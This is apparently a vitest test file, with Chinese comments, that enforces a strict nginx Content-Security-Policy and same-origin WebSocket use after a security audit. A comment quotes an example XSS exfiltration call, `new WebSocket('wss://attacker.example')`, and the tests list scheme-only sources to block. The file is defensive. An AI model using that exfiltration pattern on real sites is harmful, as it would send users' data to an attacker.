import { readFileSync, readdirSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'

// 資安稽核 2026-10-28 P3：nginx CSP connect-src 尾端的裸 `wss: ws:` 讓任何 XSS 都能
// `new WebSocket('wss://attacker.example')` 把資料外送，整個 connect-src 白名單被繞過。

const root = process.cwd()

function directives(): Record<string, string[]> {
  const conf = readFileSync(join(root, 'nginx-security-headers.conf'), 'utf8')
  const csp = conf.match(/^add_header Content-Security-Policy "([^"]+)"/m)?.[1]
  expect(csp).toBeTruthy()
  const out: Record<string, string[]> = {}
  for (const part of (csp ?? '').split(';')) {
    const [name, ...tokens] = part.trim().split(/\s+/)
    if (name) out[name] = tokens
  }
  return out
}

describe('nginx CSP connect-src 不得用 scheme 通配放行 WebSocket', () => {
  it('connect-src 無裸 ws: / wss:，同源以 self 與 wss://$host 涵蓋', () => {
    const connect = directives()['connect-src'] ?? []
    expect(connect).not.toContain('ws:')
    expect(connect).not.toContain('wss:')
    expect(connect).toContain("'self'")
    // 舊版 Safari 的 'self' 不涵蓋 ws/wss，用請求 Host（nginx $host，即各租戶網域）明列同源 wss
    expect(connect).toContain('wss://$host')
  })

  // 結構守衛：擋整類「白名單被 scheme-only 來源架空」——任何 directive 都不得出現
  // http: / https: / ws: / wss: 這種不限主機的來源；data: / blob: 只允許在 img-src / font-src。
  it('任何 directive 都不含 scheme-only 來源', () => {
    const SCHEME_ONLY = new Set(['http:', 'https:', 'ws:', 'wss:'])
    const DATA_OK: Record<string, Set<string>> = {
      'img-src': new Set(['data:', 'blob:']),
      'font-src': new Set(['data:']),
    }
    const offenders: Record<string, string[]> = {}
    for (const [name, tokens] of Object.entries(directives())) {
      const bad = tokens.filter(
        (t) => SCHEME_ONLY.has(t) || ((t === 'data:' || t === 'blob:') && !DATA_OK[name]?.has(t)),
      )
      if (bad.length) offenders[name] = bad
    }
    expect(offenders).toEqual({})
  })

  // 結構守衛：wss://$host 只涵蓋同源。前端若新增連到別台主機的 WebSocket，CSP 會擋，
  // 這裡先在 CI 紅：所有 new WebSocket(...) 都必須以 location.host 組 URL。
  it('前端所有 WebSocket 都連同源 location.host', () => {
    const files: string[] = []
    const walk = (dir: string) => {
      for (const name of readdirSync(dir)) {
        const p = join(dir, name)
        if (statSync(p).isDirectory()) {
          if (name !== '__tests__' && name !== '_generated') walk(p)
        } else if (/\.(ts|vue)$/.test(name) && !/\.(test|spec)\.ts$/.test(name)) {
          files.push(p)
        }
      }
    }
    walk(join(root, 'src'))
    const offenders: string[] = []
    let count = 0
    for (const f of files) {
      const src = readFileSync(f, 'utf8')
      for (const m of src.matchAll(/new WebSocket\(([^)]*)\)/g)) {
        count++
        if (!/location\.host\b/.test(m[1])) offenders.push(`${f}: ${m[0]}`)
      }
    }
    expect(count).toBeGreaterThan(0)
    expect(offenders).toEqual([])
  })
})
